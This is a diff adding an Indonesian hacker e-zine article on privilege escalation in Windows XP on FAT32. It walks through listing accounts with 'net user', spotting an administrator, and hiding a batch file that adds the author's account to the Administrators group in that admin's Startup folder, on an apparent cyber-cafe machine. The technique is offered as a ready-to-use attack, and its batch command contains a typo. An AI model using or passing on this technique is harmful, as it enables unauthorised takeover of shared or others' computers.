@@ -1,0 +1,118 @@
+
+               E C H O   E - Z I N E   I s s u e   # 1 0               
+
+--------------------[ Exploitasi Windows XP (Fat32) ]---------------------
+--------------------------------------------------------------------------
+---------------------[ [mRt] <martin_csk@yahoo.com> ]---------------------
+
+
+--- 00 // Intro ----------------------------------------------------------
+
+Hii all... ketemu lagi dengan saya. Diartikel kali ini saya akan membahas 
+bagaimana cara agar user bisa mendapatkan akses admin di mesin Windows 
+XP (Fat32).
+
+
+--- 01 // Eksploitasi ----------------------------------------------------
+
+Metode eksploitasi yang akan dijelaskan hanya bekerja pada Window XP yang 
+menggunakan sistim Fat32. Windows XP yang file systemnya Fat32 membolehkan 
+user biasa mengakses direktory home dari admin yang biasanya terletak
+pada:
+
+C:\Documents and Settings\Administrator\
+
+Sedangkan di Windows XP yang file systemnya sudah NTFS, user biasa tidak 
+akan bisa mengakses direktory home dari admin. Kalau dipaksakan maka 
+dipastikan dengan sukses akan keluar pesan
+
+	Access Denied
+
+Proses eksploitasi dapat dilakukan dengan cara...
+
+// MELIHAT USER YANG TERDAFTAR
+
+C:\DOCUME~1\mRt>net user		
+
+User accounts for \\CyberCafe
+
+------------------------------------------------------------
+Administrator            Guest                    mRt
+HelpAssistant            SUPPORT_388945a0	  Win_Xp	
+The command completed successfully.
+
+
+
+MELIHAT HAK AKSES USER
+------------------------
+
+C:\DOCUME~1\mRt>net user Win_Xp 	 
+User name                    Win_Xp
+Full Name
+Comment
+User's comment
+Country code                 000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/9/2005 3:38 AM
+Password expires             Never
+Password changeable          1/9/2005 3:38 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/26/2005 11:16 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators  <-- ketahuan aksesnya
+Global Group memberships     *None
+The command completed successfully.
+
+Setelah mengetahui siapa user yang mempunyai akses admin, sekaranglah 
+saatnya untuk beraksi. Pertama-tama buat dulu script batch yang 
+akan mengangkat user kita menjadi admin.
+
+<++ batchfile ++>
+
+net localgoup Administrators mRt /add
+
+<-- batchfile -->
+
+setelah kita buat script batch tersebut, kemudian simpan di 
+direktory:
+
+C:\Documents and Settings\Win_Xp\Start Menu\Programs\Startup
+
+Agar kelihatan lebih rapi sebaiknya script batch tersebut dibuat 
+hidden. Lalu mengunggu user yang mempunyai akses admin tersebut 
+login, setelah user yang mempunyai akses admin tersebut login 
+maka akses user yang ada pada kita bakalan hilang digantikan 
+dengan akses admin.
+
+
+--- 02 // Penutup --------------------------------------------------------
+
+Disayangkan, cara ini dapat mengundang kecurigaan admin, karena ketika 
+sang admin telah melakukan proses login maka dia akan melihat sekelebat 
+tampilan DOS Prompt yang tiba-tiba muncul di desktopnya.
+
+Semoga artikel ini dapat "sedikit" menambah pengetahuan kita semua.
+
+
+--- 03 // Referensi ------------------------------------------------------
+
+- http://www.google.com/
+- The Complete Windows Trojan Paper by Dancho Danchev
+
+
+--- 04 // Greetz ---------------------------------------------------------
+
+echo|staff, zylon (atas sarannya dan info e-booknya), yusak, Jasakom and 
+newbie_hacker community, i learn much more from u all.
+
+-------------------------------------------------------------- EOF //-----
